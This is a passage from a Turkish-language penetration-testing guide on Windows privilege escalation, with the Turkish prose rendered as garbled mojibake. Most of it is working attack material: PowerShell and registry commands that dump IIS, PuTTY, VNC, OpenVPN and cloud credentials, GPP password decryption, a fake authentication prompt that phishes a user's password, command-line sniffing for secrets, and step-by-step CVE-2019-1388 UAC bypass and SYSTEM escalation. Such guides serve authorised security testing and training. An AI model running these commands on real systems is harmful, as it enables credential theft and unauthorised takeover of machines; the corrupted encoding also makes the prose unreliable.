$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasÄ±nÄ±n varlÄ±ÄŸÄ±nÄ± kontrol edin.\
YÃ¼kleyiciler **SYSTEM ayrÄ±calÄ±klarÄ±yla Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, birÃ§ok yÃ¼kleyici **DLL Yan YÃ¼kleme** aÃ§Ä±ÄŸÄ±na sahiptir ([**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc) adresinden bilgi alÄ±nmÄ±ÅŸtÄ±r).

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve KayÄ±t Defteri (Kimlik Bilgileri)

### Putty Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

### Putty SSH AnahtarlarÄ±

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### KayÄ±t Defterinde SSH anahtarlarÄ±

SSH Ã¶zel anahtarlarÄ±, `HKCU\Software\OpenSSH\Agent\Keys` kayÄ±t defteri anahtarÄ±nÄ±n iÃ§ine depolanabilir, bu yÃ¼zden orada ilginÃ§ bir ÅŸey olup olmadÄ±ÄŸÄ±nÄ± kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

EÄŸer bu yol iÃ§inde herhangi bir giriÅŸ bulursanÄ±z, muhtemelen kaydedilmiÅŸ bir SSH anahtarÄ± olacaktÄ±r. Bu ÅŸifrelenmiÅŸ olarak depolanmÄ±ÅŸtÄ±r ancak [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract) kullanÄ±larak kolayca ÅŸifresi Ã§Ã¶zÃ¼lebilir.\
Bu teknik hakkÄ±nda daha fazla bilgi burada: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

EÄŸer `ssh-agent` servisi Ã§alÄ±ÅŸmÄ±yorsa ve otomatik olarak baÅŸlamasÄ±nÄ± istiyorsanÄ±z, ÅŸunu Ã§alÄ±ÅŸtÄ±rÄ±n:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

{% hint style="info" %}
Bu teknik artÄ±k geÃ§erli deÄŸil gibi gÃ¶rÃ¼nÃ¼yor. BazÄ± ssh anahtarlarÄ± oluÅŸturmayÄ± denedim, onlarÄ± `ssh-add` ile ekledim ve bir makineye ssh Ã¼zerinden giriÅŸ yapmaya Ã§alÄ±ÅŸtÄ±m. HKCU\Software\OpenSSH\Agent\Keys kaydÄ± mevcut deÄŸil ve procmon, asimetrik anahtar kimlik doÄŸrulamasÄ± sÄ±rasÄ±nda `dpapi.dll`'nin kullanÄ±mÄ±nÄ± tespit etmedi.
{% endhint %}

### Otomatik dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

AyrÄ±ca bu dosyalarÄ± **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum\_unattend_

Ã–rnek iÃ§erik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```

### SAM ve SYSTEM yedeklemeleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** dosyasÄ±nÄ± arayÄ±n

### Ã–nbelleÄŸe AlÄ±nmÄ±ÅŸ GPP Åifresi

Daha Ã¶nce mevcut olan bir Ã¶zellik, Grup Ä°lkesi Tercihleri (GPP) aracÄ±lÄ±ÄŸÄ±yla bir grup makineye Ã¶zel yerel yÃ¶netici hesaplarÄ±nÄ±n daÄŸÄ±tÄ±lmasÄ±na izin veriyordu. Ancak, bu yÃ¶ntemin ciddi gÃ¼venlik aÃ§Ä±klarÄ± vardÄ±. Ä°lk olarak, SYSVOL'de XML dosyalarÄ± olarak depolanan Grup Ä°lkesi Nesnelerine (GPO'lar) herhangi bir etki alanÄ± kullanÄ±cÄ±sÄ± tarafÄ±ndan eriÅŸilebilirdi. Ä°kinci olarak, bu GPP'lerdeki ÅŸifreler, genel olarak belgelenmiÅŸ varsayÄ±lan bir anahtar kullanÄ±larak AES256 ile ÅŸifrelenmiÅŸ olmasÄ±na raÄŸmen, herhangi bir kimlik doÄŸrulama yapmÄ±ÅŸ kullanÄ±cÄ± tarafÄ±ndan Ã§Ã¶zÃ¼lebilirdi. Bu ciddi bir risk oluÅŸturuyordu, Ã§Ã¼nkÃ¼ kullanÄ±cÄ±lara yÃ¼ksek ayrÄ±calÄ±klar kazanma olanaÄŸÄ± tanÄ±yabilirdi.

Bu riski azaltmak iÃ§in, yerel olarak Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ GPP dosyalarÄ±nÄ± taramak iÃ§in bir iÅŸlev geliÅŸtirildi. Bu dosyalarÄ±n iÃ§inde boÅŸ olmayan bir "cpassword" alanÄ± bulunduÄŸunda, iÅŸlev ÅŸifreyi Ã§Ã¶zer ve Ã¶zel bir PowerShell nesnesi dÃ¶ndÃ¼rÃ¼r. Bu nesne, GPP ve dosyanÄ±n konumu hakkÄ±nda detaylar iÃ§erir ve bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n tanÄ±mlanmasÄ± ve giderilmesine yardÄ±mcÄ± olur.

Bu dosyalarÄ± aramak iÃ§in `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista'dan Ã¶nce)_ konumuna bakÄ±n:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPassword'i Ã§Ã¶zmek iÃ§in:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kullanarak ÅŸifreleri almak iÃ§in crackmapexec:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web YapÄ±landÄ±rmasÄ±

```powershell
Get-Childitem â€“Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem â€“Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem â€“Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Web.config dosyasÄ± Ã¶rneÄŸi kimlik bilgileriyle:

```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### GÃ¼nlÃ¼kler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem â€“Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteyin

Her zaman **kullanÄ±cÄ±dan kimlik bilgilerini veya hatta farklÄ± bir kullanÄ±cÄ±nÄ±n kimlik bilgilerini girmesini isteyebilirsiniz** eÄŸer onlarÄ± biliyor olabileceÄŸini dÃ¼ÅŸÃ¼nÃ¼yorsanÄ±z (mÃ¼ÅŸteriden **kimlik bilgilerini sormak** gerÃ§ekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri iÃ§eren olasÄ± dosya adlarÄ±**

BazÄ± zamanlar **ÅŸifreleri** **aÃ§Ä±k metin** veya **Base64** iÃ§eren bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

TÃ¼m Ã¶nerilen dosyalarÄ± arayÄ±n:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem â€“Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri DÃ¶nÃ¼ÅŸÃ¼m Kutusundaki Kimlik Bilgileri

AyrÄ±ca, iÃ§inde kimlik bilgileri aramak iÃ§in Kutuyu kontrol etmelisiniz.

Ã‡eÅŸitli programlar tarafÄ±ndan kaydedilen **ÅŸifreleri kurtarmak** iÃ§in ÅŸu baÄŸlantÄ±yÄ± kullanabilirsiniz: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### KayÄ±t Defterinde

**Kimlik bilgileri iÃ§eren diÄŸer olasÄ± kayÄ±t defteri anahtarlarÄ±**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**KayÄ±ttan openssh anahtarlarÄ±nÄ± Ã§Ä±karÄ±n.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### TarayÄ±cÄ± GeÃ§miÅŸi

**Chrome veya Firefox**'dan ÅŸifrelerin saklandÄ±ÄŸÄ± veritabanlarÄ±nÄ± kontrol etmelisiniz.\
AyrÄ±ca tarayÄ±cÄ±larÄ±n geÃ§miÅŸini, yer imlerini ve favorilerini kontrol edin, belki bazÄ± **ÅŸifreler orada** saklanmÄ±ÅŸtÄ±r.

TarayÄ±cÄ±lardan ÅŸifreleri Ã§Ä±karmak iÃ§in araÃ§lar:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Ãœzerine Yazma**

**Component Object Model (COM)**, Windows iÅŸletim sistemi iÃ§inde yer alan, farklÄ± dillerdeki yazÄ±lÄ±m bileÅŸenleri arasÄ±nda **iletiÅŸim** saÄŸlayan bir teknolojidir. Her COM bileÅŸeni bir sÄ±nÄ±f kimliÄŸi (CLSID) ile tanÄ±mlanÄ±r ve her bileÅŸen bir veya daha fazla arayÃ¼zÃ¼, arayÃ¼z kimlikleri (IIDs) ile iÅŸlevselliÄŸi aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.

COM sÄ±nÄ±flarÄ± ve arayÃ¼zleri, sÄ±rasÄ±yla **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** ve **HKEY\_**_**CLASSES\_**_**ROOT\Interface** altÄ±nda kaydedilir. Bu kayÄ±t defteri, **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** birleÅŸtirilerek oluÅŸturulur = **HKEY\_**_**CLASSES\_**_**ROOT.**

Bu kayÄ±t defterinin CLSIDs iÃ§inde, **InProcServer32** adlÄ± Ã§ocuk kayÄ±t defterini bulabilirsiniz. Bu, bir **DLL**'ye iÅŸaret eden bir **varsayÄ±lan deÄŸer** ve **Apartment** (Tek Ä°plikli), **Free** (Ã‡ok Ä°plikli), **Both** (Tek veya Ã‡ok) veya **Neutral** (Ä°plik NÃ¶tr) olabilen **ThreadingModel** adÄ±nda bir deÄŸer iÃ§erir.

![](<../../.gitbook/assets/image (638).png>)

Temelde, **yÃ¼rÃ¼tÃ¼lecek olan DLL'lerden herhangi birini Ã¼zerine yazabilirseniz**, bu DLL'nin farklÄ± bir kullanÄ±cÄ± tarafÄ±ndan yÃ¼rÃ¼tÃ¼lmesi durumunda **yetkileri yÃ¼kseltebilirsiniz**.

SaldÄ±rganlarÄ±n COM Hijacking'i kalÄ±cÄ±lÄ±k mekanizmasÄ± olarak nasÄ±l kullandÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in ÅŸu adrese bakÄ±n:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Dosyalarda ve kayÄ±t defterinde Genel Åifre aramasÄ±**

**Dosya iÃ§eriÄŸini arayÄ±n**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adÄ±yla dosya arayÄ±n**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**KayÄ±t defterinde anahtar adlarÄ± ve ÅŸifreleri arayÄ±n**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parola arayan araÃ§lar

[**MSF-Credentials Eklentisi**](https://github.com/carlospolop/MSF-Credentials) **ben bu eklentiyi oluÅŸturdum** bu eklenti **kurbanÄ±n iÃ§indeki kimlik bilgilerini arayan her metasploit POST modÃ¼lÃ¼nÃ¼ otomatik olarak Ã§alÄ±ÅŸtÄ±rmak iÃ§in** oluÅŸturulmuÅŸtur.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) otomatik olarak bu sayfada belirtilen tÃ¼m parolalarÄ± iÃ§eren dosyalarÄ± arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola Ã§Ä±karmak iÃ§in harika bir araÃ§tÄ±r.

**SessionGopher** aracÄ±, bu verileri aÃ§Ä±k metin olarak saklayan Ã§eÅŸitli araÃ§larÄ±n (**PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP**) **oturumlarÄ±**, **kullanÄ±cÄ± adlarÄ±nÄ±** ve **parolalarÄ±** arar.

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## SÄ±zdÄ±rÄ±lan Ä°ÅŸleyiciler

**SÄ°STEM olarak Ã§alÄ±ÅŸan bir iÅŸlem**, `OpenProcess()` ile **tam eriÅŸim** ile **yeni bir iÅŸlem aÃ§ar**. AynÄ± iÅŸlem aynÄ± zamanda **dÃ¼ÅŸÃ¼k ayrÄ±calÄ±klarla yeni bir iÅŸlem oluÅŸturur** (`CreateProcess()`), **ancak ana iÅŸlemin tÃ¼m aÃ§Ä±k iÅŸleyicilerini devralÄ±r**.\
Sonra, **dÃ¼ÅŸÃ¼k ayrÄ±calÄ±klÄ± iÅŸleme tam eriÅŸiminiz varsa**, `OpenProcess()` ile oluÅŸturulan **aÃ§Ä±k iÅŸleyiciyi yakalayabilir** ve **bir shellcode enjekte edebilirsiniz**.\
[Bu zafiyetin **nasÄ±l tespit edilip istismar edileceÄŸi** hakkÄ±nda daha fazla bilgi iÃ§in bu Ã¶rneÄŸi okuyun.](leaked-handle-exploitation.md)\
[FarklÄ± izin seviyeleriyle devralÄ±nan iÅŸlemler ve iÅŸ parÃ§acÄ±klarÄ±nÄ±n daha fazla aÃ§Ä±k iÅŸleyicisini nasÄ±l test edip kÃ¶tÃ¼ye kullanacaÄŸÄ±nÄ±z hakkÄ±nda daha kapsamlÄ± bir aÃ§Ä±klama iÃ§in bu **diÄŸer yazÄ±yÄ± okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## AdlandÄ±rÄ±lmÄ±ÅŸ Boru Ä°stemci Taklit Etme

**Borular** olarak adlandÄ±rÄ±lan paylaÅŸÄ±lan bellek segmentleri, iÅŸlem iletiÅŸimini ve veri transferini saÄŸlar.

Windows, farklÄ± aÄŸlar Ã¼zerinden bile iliÅŸkisiz iÅŸlemlerin veri paylaÅŸmasÄ±na izin veren **AdlandÄ±rÄ±lmÄ±ÅŸ Borular** adlÄ± bir Ã¶zellik sunar. Bu, rolleri **adlandÄ±rÄ±lmÄ±ÅŸ boru sunucusu** ve **adlandÄ±rÄ±lmÄ±ÅŸ boru istemcisi** olarak tanÄ±mlanan bir istemci/sunucu mimarisine benzer.

Bir **istemci** tarafÄ±ndan bir boru aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilen verilerde, boruyu kuran **sunucu**, gerekli **SeImpersonate** haklarÄ±na sahipse, **istemcinin kimliÄŸini alabilir**. Ä°letiÅŸim kuran bir **aÄŸÄ±r ayrÄ±calÄ±klÄ± iÅŸlemi tanÄ±mlayarak**, bu iÅŸlemle etkileÅŸime girdiÄŸinde oluÅŸturduÄŸunuz boruyla etkileÅŸime geÃ§tiÄŸinde o iÅŸlemin kimliÄŸini benimseyerek **daha yÃ¼ksek ayrÄ±calÄ±klar elde etme** fÄ±rsatÄ± bulunmaktadÄ±r. Bu tÃ¼r bir saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in talimatlar [**burada**](named-pipe-client-impersonation.md) ve [**burada**](./#from-high-integrity-to-system) bulunabilir.

AyrÄ±ca aÅŸaÄŸÄ±daki araÃ§, **bir burp gibi bir araÃ§la adlandÄ±rÄ±lmÄ±ÅŸ bir boru iletiÅŸimini dinlemeyi saÄŸlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araÃ§, tÃ¼m borularÄ± listelemenize ve ayrÄ±calÄ±klarÄ± bulmanÄ±za olanak tanÄ±r** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Ã‡eÅŸitli

### **Åifreleri Ä°zlemek Ä°Ã§in Komut SatÄ±rlarÄ±nÄ± Ä°zleme**

Bir kullanÄ±cÄ± olarak bir kabuk aldÄ±ÄŸÄ±nÄ±zda, **komut satÄ±rÄ±nda kimlik bilgilerini ileten zamanlanmÄ±ÅŸ gÃ¶revler veya diÄŸer iÅŸlemler olabilir**. AÅŸaÄŸÄ±daki betik, her iki saniyede bir iÅŸlem komut satÄ±rlarÄ±nÄ± yakalar ve mevcut durumu Ã¶nceki durumla karÅŸÄ±laÅŸtÄ±rarak herhangi bir farkÄ± Ã§Ä±ktÄ±lar.

```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Ä°ÅŸlemlerden ÅŸifreleri Ã§almak

## DÃ¼ÅŸÃ¼k AyrÄ±calÄ±klÄ± KullanÄ±cÄ±dan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Atlatma

EÄŸer grafik arayÃ¼ze eriÅŸiminiz varsa (konsol veya RDP aracÄ±lÄ±ÄŸÄ±yla) ve UAC etkinse, bazÄ± Microsoft Windows sÃ¼rÃ¼mlerinde dÃ¼ÅŸÃ¼k ayrÄ±calÄ±klÄ± bir kullanÄ±cÄ±dan bir terminal veya baÅŸka bir iÅŸlemi "NT\AUTHORITY SYSTEM" olarak Ã§alÄ±ÅŸtÄ±rmak mÃ¼mkÃ¼ndÃ¼r.

Bu, aynÄ± zafiyetle aynÄ± anda ayrÄ±calÄ±klarÄ± yÃ¼kseltme ve UAC'yi atlatma olanaÄŸÄ± saÄŸlar. Ek olarak, herhangi bir ÅŸey kurmaya gerek yoktur ve iÅŸlem sÄ±rasÄ±nda kullanÄ±lan ikili dosya, Microsoft tarafÄ±ndan imzalanmÄ±ÅŸ ve yayÄ±mlanmÄ±ÅŸtÄ±r.

Etkilenen sistemlerden bazÄ±larÄ± aÅŸaÄŸÄ±daki gibidir:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirmek gereklidir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

## YÃ¶netici Orta Seviyeden YÃ¼ksek BÃ¼tÃ¼nlÃ¼k Seviyesine / UAC Atlatma

**BÃ¼tÃ¼nlÃ¼k Seviyeleri hakkÄ±nda bilgi edinmek iÃ§in bunu okuyun**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

ArdÄ±ndan **UAC ve UAC atlatmalarÄ± hakkÄ±nda bilgi edinmek iÃ§in bunu okuyun**:

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **YÃ¼ksek BÃ¼tÃ¼nlÃ¼kten Sistem'e**

### **Yeni servis**

EÄŸer zaten YÃ¼ksek BÃ¼tÃ¼nlÃ¼k seviyesinde bir iÅŸlemde Ã§alÄ±ÅŸÄ±yorsanÄ±z, **SÄ°STEM'e geÃ§iÅŸ** sadece **yeni bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rmak** olabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

### AlwaysInstallElevated

YÃ¼ksek BÃ¼tÃ¼nlÃ¼k sÃ¼recinden **AlwaysInstallElevated kayÄ±t girdilerini etkinleÅŸtirmeyi** ve bir ters kabuk kullanarak bir _**.msi**_ sarmalayÄ±cÄ±sÄ± **kurmayÄ± deneyebilirsiniz**.\
[Daha fazla bilgi iÃ§in ilgili kayÄ±t anahtarlarÄ± ve bir _.msi_ paketi nasÄ±l kurulur burada.](./#alwaysinstallelevated)

### YÃ¼ksek + SeImpersonate ayrÄ±calÄ±ÄŸÄ± System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'den Tam Token ayrÄ±calÄ±klarÄ±na

Bu token ayrÄ±calÄ±klarÄ±na sahipseniz (bunlarÄ± muhtemelen zaten YÃ¼ksek BÃ¼tÃ¼nlÃ¼k sÃ¼recinde bulacaksÄ±nÄ±z), SeDebug ayrÄ±calÄ±ÄŸÄ± ile **nearly any process**'i (korunan olmayan sÃ¼reÃ§ler) aÃ§abilir, sÃ¼recin token'Ä±nÄ± **kopyalayabilir** ve o token ile **keyfi bir sÃ¼reÃ§ oluÅŸturabilirsiniz**.\
Bu teknik genellikle **tÃ¼m token ayrÄ±calÄ±klarÄ±na sahip SYSTEM olarak Ã§alÄ±ÅŸan herhangi bir sÃ¼reÃ§ seÃ§ilir** (_evet, tÃ¼m token ayrÄ±calÄ±klarÄ±na sahip olmayan SYSTEM sÃ¼reÃ§leri bulabilirsiniz_).\
Ã–nerilen teknik uygulamayÄ± yÃ¼rÃ¼ten [**kod Ã¶rneÄŸini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **AdlandÄ±rÄ±lmÄ±ÅŸ Borular**

